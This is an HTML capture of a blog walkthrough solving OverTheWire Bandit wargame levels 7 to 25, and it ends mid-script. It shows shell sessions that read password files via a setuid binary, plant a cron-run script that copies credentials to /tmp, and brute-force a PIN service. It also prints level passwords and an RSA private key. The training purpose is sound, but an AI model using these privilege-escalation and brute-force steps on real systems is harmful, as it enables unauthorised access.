<p>Perfect. I piped the <code>stderr</code> to <code>/dev/null</code> so it doesn&rsquo;t clutter the output
with files that it can&rsquo;t read.</p>

<h1 id="level-7-8:c0b338e2f736b59776da7641378921cf">Level 7 -&gt; 8</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit8.html">Level 07</a></p>

<p>To find things in a file, <code>grep</code> is usually the answer. However it&rsquo;s probably
wise to check the file format first in case all the words are smushed together
and we need to filter grep again.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit7@melinda:~$ head data.txt 
Kunming&#39;s	0D0KZ3TdLRBXD8lyd7Bj2hAqnxaMInQe
multitude&#39;s	8MFZa8yOjTt6m8PvxteTp7XTDFLiuFAk
audibility	ZeLj0yAw7ylmEoLxSUEqF4iB43c9DN4h
unadvised	Pgp8X2LSVdNrmIKcJ7Oe8eqTzEVfhGbR
Brecht&#39;s	uKyKryNUZYFuTQpwRlDqucLLIUbiIMF0
Alvin	IpQIV6mpjticdB790obqXAvYkAgnDV8E
insufficient	cgHhWVJahfDqFIe82vOliryQQ8ihGlGN
Sauterne	UhPBp0A04GkIRfvZnUt1UdwlKU2ViYUd
cluster	1GeFZ0B6rsEtJ5Sqb5h8Wv7UwG15DQzb
ember&#39;s	f2XPIE1iDHW9oHPyodPyfTz87DAbWmXu
bandit7@melinda:~$ grep millionth data.txt 
millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
</pre></div>


<p>Luckily it was one word and password per line, so grepping the file worked
fine.</p>

<h1 id="level-8-9:c0b338e2f736b59776da7641378921cf">Level 8 -&gt; 9</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit9.html">level 08</a></p>

<p>So the only way we know which entry is the password is that it occurs
only once. For this the linux tool <code>uniq</code> seems perfect. However it can
only detect duplicate lines if they are next to each other. To fix this
we also need to sort the contents of the file and then display only
unique lines:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit8@melinda:~$ cat data.txt <span style="color: #f8f8f2">|</span> sort <span style="color: #f8f8f2">|</span> uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
</pre></div>
</p>

<h1 id="level-9-10:c0b338e2f736b59776da7641378921cf">Level 9 -&gt; 10</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit10.html">Level 09</a></p>

<p>This <code>data.txt</code> file is in binary. So in order to find the strings we need
to dump it as hex, or, even simpler, run it through <code>strings</code>:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit9@melinda:~$ strings data.txt  <span style="color: #f8f8f2">|</span> <span style="color: #f8f8f2">grep</span> <span style="color: #f92672">==</span>
I========== the6
========== password
========== ism
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
</pre></div>
</p>

<h1 id="level-10-11:c0b338e2f736b59776da7641378921cf">Level 10 -&gt; 11</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit11.html">Level 10</a></p>

<p>Good ol base64. If you haven&rsquo;t seen it before, you&rsquo;ll get to see it a lot
more if you carry on doing these kind of challenges. Simply done though:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit10@melinda:~$ cat data.txt  <span style="color: #f8f8f2">|</span> base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
</pre></div>
</p>

<h1 id="level-11-12:c0b338e2f736b59776da7641378921cf">Level 11 -&gt; 12</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit12.html">level 11</a></p>

<p>The description is a basically a verbose way of saying that the string
has been encoded with rot13. The quickest way for me to un-rotate it, is
using python:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit11@melinda:~$ cat data.txt 
Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
bandit11@melinda:~$ python -c <span style="color: #e6db74">&#39;import codecs;print codecs.decode(&quot;5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh&quot;, &quot;rot13&quot;)&#39;</span>
5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
</pre></div>
</p>

<h1 id="level-12-13:c0b338e2f736b59776da7641378921cf">Level 12 -&gt; 13</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit13.html">Level 12</a></p>

<p>From here on it&rsquo;s going to get a little trickier. We know that data.txt is a hexdump
of a binary, so first let&rsquo;s convert it back to a binary first with <code>xxd</code></p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit12@melinda:/tmp/unl$ cat data.txt <span style="color: #f8f8f2">|</span> xxd -r &gt; data2
</pre></div>
</p>

<p>Then we can find out the filetype of data2</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit12@melinda:/tmp/unl$ file data2
data2: gzip compressed data, was &quot;data2.bin&quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
</pre></div>
</p>

<p><code>gzip</code> it is. So uncompress that to data3</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit12@melinda:/tmp/unl$ cat data2 <span style="color: #f8f8f2">|</span> zcat &gt; data3
</pre></div>
</p>

<p>and get its filetype next. I won&rsquo;t go over each step in detail as there&rsquo;s quite
a few iterations. I&rsquo;ll post the console log of how I got to the flag and hopefully
that should be clear enough.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit12@melinda:/tmp/unl$ file data3
data3: bzip2 compressed data, block size = 900k
bandit12@melinda:/tmp/unl$ bzcat data3 &gt; data4
bandit12@melinda:/tmp/unl$ file data4
data4: gzip compressed data, was &quot;data4.bin&quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
bandit12@melinda:/tmp/unl$ cat data4 <span style="color: #f8f8f2">|</span> zcat &gt; data5
bandit12@melinda:/tmp/unl$ file data5
data5: POSIX tar archive (GNU)
bandit12@melinda:/tmp/unl$ tar xf data5
bandit12@melinda:/tmp/unl$ ls
data.txt  data2  data2.bin  data3  data4  data5  data5.bin
bandit12@melinda:/tmp/unl$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@melinda:/tmp/unl$ tar xf data5.bin
bandit12@melinda:/tmp/unl$ ls
data.txt  data2  data2.bin  data3  data4  data5  data5.bin  data6.bin
bandit12@melinda:/tmp/unl$ file data6.bin 
data6.bin: bzip2 compressed data, block size = 900k
bandit12@melinda:/tmp/unl$ bzcat data6.bin &gt; data7
bandit12@melinda:/tmp/unl$ file data7
data7: POSIX tar archive (GNU)
bandit12@melinda:/tmp/unl$ tar xf data7
bandit12@melinda:/tmp/unl$ ls
data.txt  data2  data2.bin  data3  data4  data5  data5.bin  data6.bin  data7  data8.bin
bandit12@melinda:/tmp/unl$ file data8.bin
data8.bin: gzip compressed data, was &quot;data9.bin&quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
bandit12@melinda:/tmp/unl$ cat data8.bin <span style="color: #f8f8f2">|</span> zcat &gt; data9
bandit12@melinda:/tmp/unl$ file data9
data9: ASCII text
bandit12@melinda:/tmp/unl$ cat data9 
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
</pre></div>
</p>

<p>Basically we identify, extract, repeat, until we&rsquo;re at the plain text file with the
password.</p>

<h1 id="level-13-14:c0b338e2f736b59776da7641378921cf">Level 13 -&gt; 14</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit14.html">Level 13</a></p>

<p>We&rsquo;re given a lot of information here, and one of those is that we get the SSH
key for the <code>bandit14</code> user. We can use this to login as that user without knowing
the password:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit13@melinda:~$ ssh -i ./sshkey.private bandit14@localhost 
Could not create directory &#39;/home/bandit13/.ssh&#39;.
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is 05:3a:1c:25:35:0a:ed:2f:cd:87:1c:f6:fe:69:e4:f6.
Are you sure you want to continue connecting (yes/no)? yes
.
.
bandit14@melinda:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
</pre></div>
</p>

<p>We pass the key as an argument to the ssh command, and connect to the localhost
as bandit14. Then we can read the file with the password.</p>

<h1 id="level-14-15:c0b338e2f736b59776da7641378921cf">Level 14 -&gt; 15</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit15.html">Level 14</a></p>

<p>This level starts introducing some networking and how to interact with remote
hosts. Well, in this case it&rsquo;s localhost, but the principle is the same.
We need to connect to a specific port on localhost and then supply
the current password. I&rsquo;m using <code>netcat</code> to do this</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit14@melinda:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
</pre></div>
</p>

<p>All you get is a blank line when you&rsquo;ve connected. The simply paste in the
password you logged in with and hit enter.</p>

<p>Continues with <a href="http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part2">Let&rsquo;s crack Bandit Part 2</a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part2/">
        Let&#39;s crack Bandit Part 2
      </a>
    </h1>

    <span class="post-date">Fri, Mar 13, 2015</span>

    

<p>Continues on from <a href="http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1">Let&rsquo;s crack Bandit Part 1</a></p>

<h1 id="level-15-16:0e66a8a07761fc75a6c8722719cf3240">Level 15 -&gt; 16</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit16.html">Level 15</a></p>

<p>Eventhough this is very similar to the previous level, it&rsquo;s a little
more complicated as we need to connect with SSL.
The simplest way is using <code>openssl</code> with <code>s_client</code>. Once connected it&rsquo;s the
same dance as above</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit15@melinda:~$ openssl s_client -quiet -connect localhost:30001
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

read:errno=0
</pre></div>


<h1 id="level-16-17:0e66a8a07761fc75a6c8722719cf3240">Level 16 -&gt; 17</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit17.html">Level 16</a></p>

<p>Here we have a choice. We run a simple ping scan across the port range and then
figure out which port is the right one by trying each one. Depending on the number
of ports open this could take a while or not.
Let&rsquo;s see how we&rsquo;re going to handle this by seeing which ports are open</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit16@melinda:~$ nmap localhost -p 31000-32000 

Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:54 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00080s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
</pre></div>


<p>Not too bad. Because it&rsquo;s a short list, we can try them one by one, or
we run a service discovery on them. Service discovery in nmap takes a while,
so I only scan the ports we are interseted in:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit16@melinda:~$ nmap -sV -p 31046,31518,31691,31790,31960 localhost

Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:51 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00015s latency).
PORT      STATE SERVICE VERSION
31046/tcp open  echo
31518/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
31691/tcp open  echo
31790/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
31960/tcp open  echo
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</pre></div>


<p>Now we only have two ports to try, as the others are clearly just echo ports.
Eliminating one we go ahead and</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit16@melinda:~$ openssl s_client -quiet -connect localhost:31790
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

read:errno=0
</pre></div>


<p>Now copy that key into a new file and use <code>chmod go-rw key</code> to remove group
and other read/write. ssh refuses to accept a key that is read/write by
anyone other than the user who owns the file. Then simply</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit16@melinda:~$ ssh -i /tmp/k.key bandit17@localhost
</pre></div>


<h1 id="level-17-18:0e66a8a07761fc75a6c8722719cf3240">Level 17 -&gt; 18</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit18.html">Level 17</a></p>

<p>We remain logged in as bandit17 from the previous level. To compare two files
we need to do a <code>diff</code></p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit17@melinda:~$ diff passwords.old  passwords.new 
42c42
&lt; BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR
---
&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
</pre></div>


<p>The latter output is the entry in the <code>password.new</code> file, and thus the password
for bandit18.</p>

<h1 id="level-18-19:0e66a8a07761fc75a6c8722719cf3240">Level 18 -&gt; 19</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit19.html">Level 18</a></p>

<p>Oh noes. We get logged out as soon as we log in because some nefarious
individual has been editing our <code>.bashrc</code> file. Well in that case
we need to launch bash without an rc file.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">ssh bandit18@bandit.labs.overthewire.org &#39;/bin/bash --norc&#39;
cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
</pre></div>


<p>Because we launched without an rc file there&rsquo;s not going to be a prompt.
All we need to do is cat the <code>readme</code> file and the password is ours.</p>

<h1 id="level-19-20:0e66a8a07761fc75a6c8722719cf3240">Level 19 -&gt; 20</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit20.html">Level 19</a></p>

<p>Here we learn about setuid binaries. Basically this is a binary that a user can
run, but when executed runs as the setuid user. To explain, long list the file</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit19@melinda:~$ ls -al
total 28
drwxr-xr-x   2 root     root     4096 Nov 14 10:32 .
drwxr-xr-x 167 root     root     4096 Jan 12 17:44 ..
-rw-r--r--   1 root     root      220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root     root     3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root     root      675 Apr  9  2014 .profile
-rwsr-x---   1 bandit20 bandit19 7370 Nov 14 10:32 bandit20-do
</pre></div>


<p>So you see it&rsquo;s owned by <code>bandit20</code> and the <em>s</em> bit is set in <code>-rwsr-x---</code>. That&rsquo;s
how we identify setuid binaries.</p>

<p>Let&rsquo;s make use of it. This will run any command we supply, as the user <code>bandit20</code>,
so let&rsquo;s simply print the password</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
</pre></div>


<h1 id="level-20-21:0e66a8a07761fc75a6c8722719cf3240">Level 20 -&gt; 21</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit21.html">Level 20</a></p>

<p>Now we&rsquo;re entering a more complicated example of networking. Not only do we need
to connect to a host, we have to create the host to connect to. Once
<code>suconnect</code> is connected, we must pass it the password and in return we get the
one for the next level.</p>

<p>Let&rsquo;s log into a new shell to create our server with <code>netcat</code></p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit20@melinda:~$ nc -vlk 31337
Listening on [0.0.0.0] (family 0, port 31337)
</pre></div>
</p>

<p>The option <code>vlk</code> is <code>verbose</code>, <code>listen</code>, and <code>keep-open</code>. Ok, we&rsquo;re listening
and now, from another terminal, we log into level 20 and execute <code>suconnect</code>. From
our listening terminal, once we see an established connection, we send the password,
and get our new one back.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"># terminal 2
bandit20@melinda:~$ ./suconnect  31337

# terminal 1
Connection from [127.0.0.1] port 31337 [tcp/*] accepted (family 2, sport 43463)
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
</pre></div>
</p>

<h1 id="level-21-22:0e66a8a07761fc75a6c8722719cf3240">Level 21 -&gt; 22</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit22.html">Level 21</a></p>

<p>First let&rsquo;s list the crontabs in the directory supplied. Our likely
candidate is <code>/etc/cron.d/cronjob_bandit22</code> so let&rsquo;s see what it runs
and also what that script contains</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">cat /etc/cron.d/cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
bandit21@melinda:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
</pre></div>
</p>

<p>So basically it copies the password for the next level into a file in <code>/tmp</code>.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit21@melinda:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
</pre></div>
</p>

<h1 id="level-22-23:0e66a8a07761fc75a6c8722719cf3240">Level 22 -&gt; 23</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit22.html">Level 22</a></p>

<p>Pretty similar to above but with a different script</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit22@melinda:~$ cat /etc/cron.d/cronjob_bandit23
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
bandit22@melinda:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d &#39; &#39; -f 1)

echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;

cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget
</pre></div>
</p>

<p>This script takes the string <code>I am user $myname</code> and hashes it with an md5
then puts the next password into a file in <code>/tmp</code> with that filename. The easiest
thing to do is to see what the filename will be. It will run as <code>bandit23</code> so
<code>whoami</code> will return that string.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit22@melinda:~$ <span style="color: #f8f8f2">echo </span>I am user bandit23 <span style="color: #f8f8f2">|</span> md5sum <span style="color: #f8f8f2">|</span> cut -d <span style="color: #e6db74">&#39; &#39;</span> -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@melinda:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
</pre></div>
</p>

<h1 id="level-23-24:0e66a8a07761fc75a6c8722719cf3240">Level 23 -&gt; 24</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit24.html">Level 23</a></p>

<p>Once again&hellip;.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit23@melinda:~$ cat /etc/cron.d/cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;
for i in *;
do
    echo &quot;Handling $i&quot;
    ./$i
    rm -f $i
done
</pre></div>
</p>

<p>So anything in <code>/var/spool/bandit24</code> will get run as bandit24. Checking if we
can write to that directory show us</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit23@melinda:~$ ls -la /var/spool/
total 21
drwxr-xr-x  6 root     root     4096 Nov 15 14:55 .
drwxr-xr-x 15 root     root     4096 Nov 14 10:32 ..
drwxrwx---  2 bandit24 bandit23 1024 Mar 20 15:38 bandit24
</pre></div>
</p>

<p>that we can. Excellent. So let&rsquo;s write a script to cat the password to a tmp file.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">!#/bin/bash
cat /etc/bandit_pass/bandit24 &gt; /tmp/unl.pass
</pre></div>
</p>

<p>Make it executable, copy it to the right directory and then harvest the key</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit23@melinda:/tmp$ chmod +x t.sh
bandit23@melinda:/tmp$ cp t.sh /var/spool/bandit24/
bandit23@melinda:/tmp$ cat /tmp/unl.pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
</pre></div>
</p>

<h1 id="level-24-25:0e66a8a07761fc75a6c8722719cf3240">Level 24 -&gt; 25</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit25.html">Level 24</a></p>

<p>Here we need to bruteforce our way to the password. No point entering our
tries by hand, so let&rsquo;s leverage the power of bash. First create a loop
to print the values, so we can be sure the input to the netcat command is
going to be right</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit24@melinda:~$ <span style="color: #66d9ef">for</span> i in <span style="color: #66d9ef">$(</span>seq -f <span style="color: #e6db74">&quot;%04g&quot;</span> <span style="color: #ae81ff">0</span> 9999<span style="color: #66d9ef">)</span><span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">do</span> <span style="color: #f8f8f2">echo</span> <span style="color: #e6db74">&#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &#39;${</span><span style="color: #f8f8f2">i</span><span style="color: #e6db74">}</span><span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">done</span>
.
.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9856
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9857
.
.
</pre></div>
</p>

<p>seems to ne what we want. Let&rsquo;s actually pass it onto the command. Because each
iteration will take a while, we have plenty of time to stop it when it finds the
right answer</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit24@melinda:~$ <span style="color: #66d9ef">for</span> i in <span style="color: #66d9ef">$(</span>seq -f <span style="color: #e6db74">&quot;%04g&quot;</span> <span style="color: #ae81ff">0</span> 9999<span style="color: #66d9ef">)</span><span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">do</span> <span style="color: #f8f8f2">echo</span> <span style="color: #e6db74">&#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &#39;${</span><span style="color: #f8f8f2">i</span><span style="color: #e6db74">}</span> <span style="color: #f8f8f2">|</span> nc localhost 30002<span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">done</span> 
</pre></div>
</p>

<p>But who wants to sit there watching a screen? A quick Python script and we can
leave it running until it finds the right PIN.
Sometimes you just have to be patient.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">socket</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">netcat</span><span style="color: #f8f8f2">(hostname,</span> <span style="color: #f8f8f2">port,</span> <span style="color: #f8f8f2">content):</span>
    <span style="color: #f8f8f2">s</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">socket(socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">AF_INET,</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SOCK_STREAM)</span>
    <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">connect((hostname,</span> <span style="color: #f8f8f2">port))</span>
    <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendall(content)</span>
    <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">shutdown(socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SHUT_WR)</span>
    <span style="color: #66d9ef">while</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:</span>
        <span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">data</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&quot;&quot;</span><span style="color: #f8f8f2">:</span>
            <span style="color: #66d9ef">break</span>
        <span style="color: #66d9ef">if</span> <span style="color: #e6db74">&#39;I am the pincode&#39;</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">repr(data):</span>
            <span style="color: #66d9ef">continue</span>

        <span style="color: #66d9ef">if</span> <span style="color: #e6db74">&#39;Wrong&#39;</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">repr(data):</span>
            <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;no:&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">content</span>
            <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span>
        <span style="color: #66d9ef">else</span><span style="color: #f8f8f2">:</span>
            <span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">repr(data)</span>
            <span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">content</span>
            <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">1</span>

    <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Connection closed.&quot;</span>
    <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>

<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>

<span style="color: #f8f8f2">passw</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&#39;</span>
<span style="color: #f8f8f2">count</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span>
<span style="color: #66d9ef">while</span> <span style="color: #f8f8f2">(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">):</span>
    <span style="color: #f8f8f2">trypass</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;%s %04d&#39;</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">(passw,</span> <span style="color: #f8f8f2">count)</span>
